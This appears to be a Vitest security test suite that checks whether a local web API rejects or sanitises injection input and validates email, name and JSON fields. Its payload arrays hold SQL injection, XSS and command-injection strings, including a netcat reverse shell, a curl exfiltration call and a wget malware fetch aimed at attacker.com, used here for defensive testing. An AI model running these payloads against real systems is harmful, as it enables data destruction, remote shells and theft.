import { describe, it, expect, beforeAll } from "vitest"

describe("Security Test Suite - Input Validation", () => {
  let baseUrl: string

  beforeAll(() => {
    baseUrl = "http://localhost:3000"
  })

  describe("SQL Injection Prevention", () => {
    it("should prevent SQL injection in email fields", async () => {
      const sqlInjectionPayloads = [
        "test@example.com'; DROP TABLE users; --",
        "test@example.com' OR '1'='1",
        "test@example.com'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "test@example.com' UNION SELECT * FROM users --",
        "test@example.com'; UPDATE users SET email='hacked@evil.com' WHERE id=1; --"
      ]

      for (const payload of sqlInjectionPayloads) {
        const response = await fetch(`${baseUrl}/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: payload })
        })

        // Should either reject the payload or sanitize it safely
        if (response.status === 200) {
          const userData = await response.json()
          // If accepted, the email should be sanitized
          expect(userData.email).not.toContain("DROP TABLE")
          expect(userData.email).not.toContain("INSERT INTO")
          expect(userData.email).not.toContain("UPDATE users")
          expect(userData.email).not.toContain("UNION SELECT")
        } else {
          // Should return 400 for invalid input
          expect(response.status).toBe(400)
        }
      }
    })

    it("should prevent SQL injection in name fields", async () => {
      // First create a user to test with
      const user = await createTestUser(`injection-test-${Date.now()}@example.com`)

      const sqlInjectionNames = [
        "Robert'; DROP TABLE people; --",
        "Alice' OR '1'='1",
        "Bob'; INSERT INTO people (firstName) VALUES ('Hacker'); --",
        "Charlie' UNION SELECT * FROM users --"
      ]

      for (const maliciousName of sqlInjectionNames) {
        // Create a group first
        const groupResponse = await fetch(`${baseUrl}/groups`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Cookie': `token=${user.token}`
          },
          body: JSON.stringify({ name: `Test Group ${Date.now()}` })
        })

        const group = await groupResponse.json()

        // Try to create person with malicious name
        const personResponse = await fetch(`${baseUrl}/groups/${group.id}/people`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Cookie': `token=${user.token}`
          },
          body: JSON.stringify({
            firstName: maliciousName,
            lastName: "TestLast"
          })
        })

        if (personResponse.status === 200) {
          const personData = await personResponse.json()
          // Name should be sanitized
          expect(personData.firstName).not.toContain("DROP TABLE")
          expect(personData.firstName).not.toContain("INSERT INTO")
          expect(personData.firstName).not.toContain("UNION SELECT")
        } else {
          // Should reject invalid input
          expect(personResponse.status).toBe(400)
        }
      }
    })
  })

  describe("XSS Prevention", () => {
    it("should prevent XSS in user input fields", async () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<div style=\"background:url(javascript:alert('XSS'))\">",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
      ]

      for (const payload of xssPayloads) {
        // Test XSS in email field
        const emailResponse = await fetch(`${baseUrl}/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: `test${Date.now()}@example.com${payload}` })
        })

        if (emailResponse.status === 200) {
          const userData = await emailResponse.json()
          // Should be sanitized
          expect(userData.email).not.toContain("<script>")
          expect(userData.email).not.toContain("javascript:")
          expect(userData.email).not.toContain("onerror=")
          expect(userData.email).not.toContain("onload=")
        }

        // Test XSS in group names
        const user = await createTestUser(`xss-test-${Date.now()}@example.com`)
        const groupResponse = await fetch(`${baseUrl}/groups`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Cookie': `token=${user.token}`
          },
          body: JSON.stringify({ name: `Test Group ${payload}` })
        })

        if (groupResponse.status === 200) {
          const groupData = await groupResponse.json()
          // Should be sanitized
          expect(groupData.name).not.toContain("<script>")
          expect(groupData.name).not.toContain("javascript:")
          expect(groupData.name).not.toContain("onerror=")
          expect(groupData.name).not.toContain("onload=")
        }
      }
    })

    it("should prevent XSS in JSON responses", async () => {
      const user = await createTestUser(`json-xss-${Date.now()}@example.com`)
      
      const response = await fetch(`${baseUrl}/users/me`, {
        headers: { 'Cookie': `token=${user.token}` }
      })

      const responseText = await response.text()
      
      // Response should not contain executable scripts
      expect(responseText).not.toContain("<script>")
      expect(responseText).not.toContain("javascript:")
      expect(responseText).not.toContain("onerror=")
      expect(responseText).not.toContain("onload=")
      
      // Should be valid JSON
      expect(() => JSON.parse(responseText)).not.toThrow()
    })
  })

  describe("Command Injection Prevention", () => {
    it("should prevent command injection in input fields", async () => {
      const commandInjectionPayloads = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(ls -la)",
        "; nc -e /bin/sh attacker.com 4444",
        "| curl http://attacker.com/steal?data=",
        "&& wget http://attacker.com/malware.sh -O /tmp/mal.sh"
      ]

      for (const payload of commandInjectionPayloads) {
        const response = await fetch(`${baseUrl}/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: `test${Date.now()}@example.com${payload}` })
        })

        // Should either reject or sanitize the payload
        if (response.status === 200) {
          const userData = await response.json()
          expect(userData.email).not.toContain(";")
          expect(userData.email).not.toContain("|")
          expect(userData.email).not.toContain("&&")
          expect(userData.email).not.toContain("`")
          expect(userData.email).not.toContain("$")
        } else {
          expect(response.status).toBe(400)
        }
      }
    })
  })

  describe("Data Validation", () => {
    it("should validate email format strictly", async () => {
      const invalidEmails = [
        "",
        "invalid",
        "@example.com",
        "test@",
        "test..test@example.com",
        "test@.com",
        "test@com",
        "test@example.",
        "test @example.com",
        "test@exam ple.com",
        "a".repeat(255) + "@example.com", // Too long
        "test@" + "a".repeat(250) + ".com" // Domain too long
      ]

      for (const email of invalidEmails) {
        const response = await fetch(`${baseUrl}/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        })

        expect(response.status).toBe(400)
        const errorBody = await response.json()
        expect(errorBody).toHaveProperty('_tag')
      }
    })

    it("should validate name fields securely", async () => {
      const user = await createTestUser(`name-validation-${Date.now()}@example.com`)

      // Create a group first
      const groupResponse = await fetch(`${baseUrl}/groups`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': `token=${user.token}`
        },
        body: JSON.stringify({ name: `Test Group ${Date.now()}` })
      })

      const group = await groupResponse.json()

      const invalidNames = [
        "", // Empty
        "a", // Too short
        "a".repeat(51), // Too long
        "Test123", // Numbers
        "Test@Name", // Special characters
        "Test<>Name", // HTML characters
        "   ", // Only whitespace
        "Test\nName", // Newlines
        "Test\tName", // Tabs
      ]

      for (const name of invalidNames) {
        const response = await fetch(`${baseUrl}/groups/${group.id}/people`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Cookie': `token=${user.token}`
          },
          body: JSON.stringify({
            firstName: name,
            lastName: "ValidLast"
          })
        })

        expect(response.status).toBe(400)
      }
    })

    it("should validate JSON payload structure", async () => {
      const invalidPayloads = [
        "", // Empty
        "{", // Invalid JSON
        '{"email": }', // Invalid syntax
        '{"email": "test@example.com", "extra": "field"}', // Extra fields
        '{"wrongField": "test@example.com"}', // Wrong field name
        null, // Null payload
        "string instead of object", // Wrong type
      ]

      for (const payload of invalidPayloads) {
        const response = await fetch(`${baseUrl}/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: typeof payload === 'string' ? payload : JSON.stringify(payload)
        })

        expect(response.status).toBe(400)
      }
    })
  })

  // Helper function
  async function createTestUser(email: string) {
    const response = await fetch(`${baseUrl}/users`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email })
    })

    const userData = await response.json()
    const token = response.headers.get('set-cookie')?.match(/token=([^;]+)/)?.[1]

    return { userData, token: token! }
  }
})
